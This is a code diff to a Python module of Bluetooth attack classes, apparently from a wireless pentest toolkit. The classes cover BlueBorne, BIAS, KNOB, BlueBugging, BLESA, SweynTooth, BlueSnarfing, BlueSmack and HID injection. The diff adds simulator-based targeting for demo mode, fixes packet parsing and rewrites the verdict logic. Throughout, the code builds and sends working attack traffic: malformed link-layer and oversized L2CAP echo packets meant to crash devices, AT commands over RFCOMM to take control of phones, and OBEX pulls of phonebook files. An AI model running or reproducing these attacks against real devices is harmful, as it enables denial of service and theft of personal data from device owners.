@@ -73,8 +73,23 @@ SNARF_OBJECTS = (
 
 
 def _target(ctx: AttackContext) -> str:
-    """The Bluetooth address this run is aimed at (``--bt-target``)."""
-    return (getattr(ctx.config, "bt_target", "") or "").strip()
+    """The Bluetooth address this run is aimed at.
+
+    ``--bt-target`` names it in live mode.  In demo mode the target comes from
+    :mod:`wifipilot.blesim` — the weakest device that can answer the question this attack
+    asks — and the role it aims with is on the context, put there by ``aim()`` before the
+    battery is built.  Aiming a demo run at a device that *can* answer is the difference
+    between a transcript and a rehearsal.
+    """
+    value = (getattr(ctx.config, "bt_target", "") or "").strip()
+    if value:
+        return value
+    if not getattr(ctx, "demo", False):
+        return ""
+    from .. import blesim
+    role = str(getattr(ctx, "bt_role", "") or "any")
+    attack = str(getattr(ctx, "bt_attack", "") or "")
+    return blesim.choose_target(attack, ctx, role=role)
 
 
 def _handle(ctx: AttackContext) -> int:
@@ -132,8 +147,9 @@ def _scan_events(data: bytes, limit: int = 64) -> List[Dict[str, Any]]:
         elif code == HCI_EVENT_LE_META and parameters:
             entry["subevent"] = parameters[0]
             if parameters[0] == 0x01 and len(parameters) >= 13:   # LE connection complete
+                # subevent, status, handle, role, address type, then the address
                 entry["handle"] = struct.unpack("<H", parameters[2:4])[0]
-                entry["address"] = bt.mac_text(parameters[7:13])
+                entry["address"] = bt.mac_text(parameters[6:12])
         events.append(entry)
         offset = end
     return events
@@ -179,6 +195,7 @@ class _BtFamous(_BtLive):
     def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
         attempt = self._attempt(ctx, ap)
         seconds = self.seconds(ctx, 3.0)
+        self.aim(ctx)
         target = _target(ctx)
         handle = _handle(ctx)
         battery = list(self.battery(ctx, ap))
@@ -190,10 +207,20 @@ class _BtFamous(_BtLive):
                 for label, packet in battery:
                     reply = bt.hci_send(sock, packet, timeout=min(1.0, seconds))
                     events = _scan_events(reply)
-                    if events:
+                    # an ACL probe is answered with ACL data, an HCI probe with an event:
+                    # both are the peer talking, and a battery that only counted events
+                    # would report "0 answered" against a device that answered every one
+                    frame = (bt.parse_acl_packet(reply).get("l2cap") or {}).get("payload") \
+                        if reply else b""
+                    if events or frame:
                         answered += 1
                     transcript.append({"probe": label, "sent": len(packet),
                                        "events": _event_names(events),
+                                       "channel": (bt.parse_l2cap(reply[1:] if reply[:1] ==
+                                                                  bytes([bt.HCI_ACL_PACKET])
+                                                                  else reply) or {}
+                                                   ).get("channel", "") if reply else "",
+                                       "bytes": len(frame),
                                        "answer": reply.hex()[:240]})
                     ctx.progress(f"{self.label}: {label}", kind="attack", bssid=ap.bssid,
                                  detail=f"{answered}/{len(battery)} probe(s) answered")
@@ -205,7 +232,9 @@ class _BtFamous(_BtLive):
             transcript = [{"probe": label, "sent": len(packet), "events": ["simulated"],
                            "answer": ""} for label, packet in battery]
         extras = self.follow_up(ctx, ap, sock, transcript)
-        simulated = sock is None
+        # demo mode still transmits — into the simulation — so "simulated" is the mode,
+        # not the absence of a socket, and the transcript is as real as the run
+        simulated = bool(getattr(ctx, "demo", False))
         detail = (f"{len(battery)} probe(s), {answered} answered, over {seconds:.1f}s"
                   + (f" against {target}" if target else
                      " (no --bt-target given: this is the battery that would go out)")
@@ -247,6 +276,7 @@ class BlueBorneAttack(_BtFamous):
     """
 
     name = "bt_blueborne"
+    role = "fragile"
     label = "BlueBorne probe (L2CAP/SDP stack, CVE-2017-1000250/1000251)"
     category = "dos"
     noise = "moderate"
@@ -314,14 +344,27 @@ class BlueBorneAttack(_BtFamous):
                                 timeout=1.0)
             events = _event_names(_scan_events(reply))
             alive = bool(reply)
-        return {"alive_after": alive, "liveness_events": events}
+        silent = [entry.get("probe") for entry in transcript if not entry.get("answer")]
+        # a probe the stack did not answer is the finding: the battery took something
+        # down, whether or not the controller's link control still answers afterwards
+        return {"alive_after": alive, "liveness_events": events,
+                "unanswered": silent, "exposed": alive is False or bool(silent)}
 
     def verdict(self, transcript: Sequence[Dict[str, Any]], extras: Dict[str, Any]) -> str:
-        alive = extras.get("alive_after")
-        if alive is False:
+        answered = sum(1 for entry in transcript if entry.get("answer"))
+        silent = [entry.get("probe") for entry in transcript
+                  if not entry.get("answer") and entry.get("sent")]
+        if silent and answered:
+            return (f"the stack stopped answering after {answered} of {len(transcript)} "
+                    f"probe(s): {silent[0]} is the PDU that took it down, and the target "
+                    "needs a power cycle")
+        if silent and not answered:
+            return ("the stack answered nothing at all: the link was already down, or the "
+                    "first PDU ended it — the transcript names it")
+        if extras.get("alive_after") is False:
             return ("the stack stopped answering: the last probe before the silence is the "
                     "one that took it down, and the target needs a power cycle")
-        if alive is True:
+        if answered == len(transcript) and transcript:
             return ("the stack answered every probe and is still serving feature reads: "
                     "patched, or not one of the affected builds")
         return ""
@@ -350,6 +393,7 @@ class BiasAttack(_BtFamous):
     """
 
     name = "bt_bias"
+    role = "bredr"
     label = "BIAS impersonation probe (CVE-2020-10135)"
     category = "rogue"
     noise = "moderate"
@@ -440,6 +484,7 @@ class KnobAttack(_BtFamous):
     """
 
     name = "bt_knob"
+    role = "bredr"
     label = "KNOB key-entropy probe (CVE-2019-9506)"
     category = "rogue"
     noise = "quiet"
@@ -535,6 +580,7 @@ class BluebuggingAttack(_BtFamous):
     """
 
     name = "bt_bluebugging"
+    role = "at"
     label = "BlueBugging (AT commands over RFCOMM)"
     category = "rogue"
     noise = "moderate"
@@ -571,18 +617,12 @@ class BluebuggingAttack(_BtFamous):
         transcript: List[Dict[str, Any]] = []
         channel = 0
         device: Dict[str, Any] = {}
-        if ctx.demo:
-            self.slept(ctx, min(seconds, 1.0))
-            channel = 3
-            device = {"address": target or "d0:9e:12:9d:36:cc", "name": "demo handset",
-                      "manufacturer": "Demo Wireless", "model": "DB-210",
-                      "serial": "352099001761481", "phonebook": "SM"}
-            transcript = [{"command": label, "answer": "OK" if label != "AT" else "AT",
-                           "simulated": True} for label, _ in self.COMMANDS]
-        elif target:
+        if target:
             sock = None
             for candidate in self.CHANNELS:
-                sock = bt.rfcomm_socket(target, candidate, timeout=1.2)
+                # the simulation in demo mode, the kernel's RFCOMM in live mode: same
+                # channel scan, same AT commands, same answers to parse
+                sock = self.rfcomm(ctx, candidate)
                 if sock is not None:
                     channel = candidate
                     break
@@ -669,6 +709,7 @@ class BlesaAttack(_BtFamous):
     """
 
     name = "bt_blesa"
+    role = "gatt"
     label = "BLESA pre-authentication data injection"
     category = "rogue"
     noise = "quiet"
@@ -720,17 +761,19 @@ class BlesaAttack(_BtFamous):
             payload = (entry.get("answer") or "").strip()
             if not payload:
                 continue
-            data = bytes.fromhex(payload)
-            for offset in range(0, max(0, len(data) - 4)):
-                if data[offset:offset + 4] == b"\x04\x00\x04\x00":     # ATT on channel 4
-                    opcode = data[offset + 4] if len(data) > offset + 4 else 0
-                    if opcode == self.ATT_ERROR:
-                        error = data[offset + 8] if len(data) > offset + 8 else 0
-                        if error in (self.ATT_INSUFFICIENT_AUTHENTICATION,
-                                     self.ATT_INSUFFICIENT_ENCRYPTION):
-                            refusals += 1
-                    elif opcode:
-                        answers += 1
+            # the answer is an ACL packet carrying an L2CAP frame carrying an ATT PDU:
+            # the same three layers the request went out through, read by the parsers
+            parsed = bt.parse_acl_packet(bytes.fromhex(payload))
+            frame = (parsed.get("l2cap") or {}).get("payload") or b""
+            if not frame:
+                continue
+            att = bt.parse_att(frame)
+            if att.get("opcode") == self.ATT_ERROR:
+                if att.get("error_code") in (self.ATT_INSUFFICIENT_AUTHENTICATION,
+                                             self.ATT_INSUFFICIENT_ENCRYPTION):
+                    refusals += 1
+            elif att.get("opcode"):
+                answers += 1
         exposed = answers > 0 and refusals == 0
         return {"att_answers": answers, "auth_refusals": refusals, "exposed": exposed,
                 "note": ("a device that refuses unauthenticated ATT work with error 0x05 "
@@ -768,6 +811,7 @@ class SweynToothAttack(_BtFamous):
     """
 
     name = "bt_sweyntooth"
+    role = "fragile"
     label = "SweynTooth malformed LL control battery (CVE-2019-17060 family)"
     category = "dos"
     noise = "moderate"
@@ -831,12 +875,16 @@ class SweynToothAttack(_BtFamous):
             # link is not serving.  Anything that comes back — a disconnection, a status —
             # means the controller is still alive.
             alive = bool(reply) and "disconnection complete" not in events
-        return {"alive_after": alive, "liveness_events": events}
+        silent = [entry.get("probe") for entry in transcript if not entry.get("answer")]
+        return {"alive_after": alive, "liveness_events": events,
+                "unanswered": silent, "exposed": alive is False or bool(silent)}
 
     def verdict(self, transcript: Sequence[Dict[str, Any]], extras: Dict[str, Any]) -> str:
-        if extras.get("alive_after") is False:
+        answered = sum(1 for entry in transcript if entry.get("answer"))
+        if extras.get("alive_after") is False or answered < len(transcript):
             return ("the link stopped answering after the battery: the controller is down, "
-                    "and the last probe in the transcript narrows the family")
+                    f"and the last probe that was answered ({answered} of {len(transcript)}) "
+                    "narrows the family")
         if extras.get("alive_after") is True:
             return ("the link answered a ping after every malformed PDU: the stack is not "
                     "one of the affected builds")
@@ -864,6 +912,7 @@ class BluesnarfAttack(_BtFamous):
     """
 
     name = "bt_bluesnarf"
+    role = "obex"
     label = "BlueSnarfing (OBEX file pull)"
     category = "rogue"
     noise = "moderate"
@@ -888,17 +937,10 @@ class BluesnarfAttack(_BtFamous):
         objects: List[Dict[str, Any]] = []
         connect_reply = b""
         channel = 0
-        if ctx.demo:
-            self.slept(ctx, min(seconds, 1.0))
-            channel = 5
-            objects.append({"name": SNARF_OBJECTS[0], "bytes": 214,
-                            "body": ("BEGIN:VCARD\r\nVERSION:2.1\r\nN:Doe;J.\r\n"
-                                     "TEL;CELL:+15550100\r\nEND:VCARD\r\n"),
-                            "simulated": True})
-        elif target:
+        if target:
             sock = None
             for candidate in self.CHANNELS:
-                sock = bt.rfcomm_socket(target, candidate, timeout=1.2)
+                sock = self.rfcomm(ctx, candidate)
                 if sock is not None:
                     channel = candidate
                     break
@@ -1000,6 +1042,7 @@ class BluesmackAttack(_BtFamous):
     """
 
     name = "bt_bluesmack"
+    role = "l2cap"
     label = "BlueSmack (oversized L2CAP echo)"
     category = "dos"
     noise = "loud"
@@ -1028,8 +1071,7 @@ class BluesmackAttack(_BtFamous):
         identifier = 1
         for size in self.SIZES:
             size = min(size, self.MAX_PAYLOAD)
-            body = bytes([0x0A, identifier & 0xFF]) + struct.pack("<H", size) \
-                + bytes([0x41]) * size
+            body = bt.l2cap_echo_request(bytes([0x41]) * size, identifier)
             out.append((f"L2CAP echo request, {size} byte(s)",
                         bt.acl_packet(handle, bt.l2cap_frame(0x0001, body))))
             identifier += 1
@@ -1045,18 +1087,31 @@ class BluesmackAttack(_BtFamous):
             events = _event_names(_scan_events(reply))
             alive = bool(reply) and "disconnection complete" not in events
         answered = [entry["probe"] for entry in transcript if entry.get("answer")]
+        silent = [entry["probe"] for entry in transcript if not entry.get("answer")]
+        # a device that answered the 600-byte echo and then stopped is a device that the
+        # *larger* one killed, whether or not its controller managed a clean disconnect:
+        # the escalation is only readable from the transcript, so read it
         return {"alive_after": alive, "liveness_events": events,
                 "largest_answered": answered[-1] if answered else "",
-                "exposed": alive is False,
+                "unanswered": silent,
+                "exposed": alive is False or bool(silent and answered),
                 "note": ("the sizes are the documented escalation; a device that survives "
                          "all four has its signalling buffer checked")}
 
     def verdict(self, transcript: Sequence[Dict[str, Any]], extras: Dict[str, Any]) -> str:
         if extras.get("exposed"):
-            return ("the link died during the escalation: the largest size that got an "
-                    "answer is the buffer that ran out")
+            last = extras.get("largest_answered") or "none"
+            gone = (extras.get("unanswered") or ["a later probe"])[0]
+            if extras.get("liveness_events"):
+                return (f"the link died during the escalation: it answered the {last} and "
+                        f"went silent on the {gone}, and never answered the ping afterwards")
+            return (f"the link stopped answering mid-escalation: the {last} was the largest "
+                    f"size it took, the {gone} is where the buffer ran out")
         if extras.get("alive_after") is True:
             return "the device answered a ping after 65535 bytes: it is not affected"
+        if extras.get("unanswered"):
+            return ("nothing came back at any size: the device may already have been down, "
+                    "so the negative result is not evidence either way")
         return ""
 
 
@@ -1087,6 +1142,7 @@ class HidInjectionAttack(_BtFamous):
     """
 
     name = "bt_hid_injection"
+    role = "hid"
     label = "Bluetooth keystroke injection (HID spoofing)"
     category = "rogue"
     noise = "moderate"
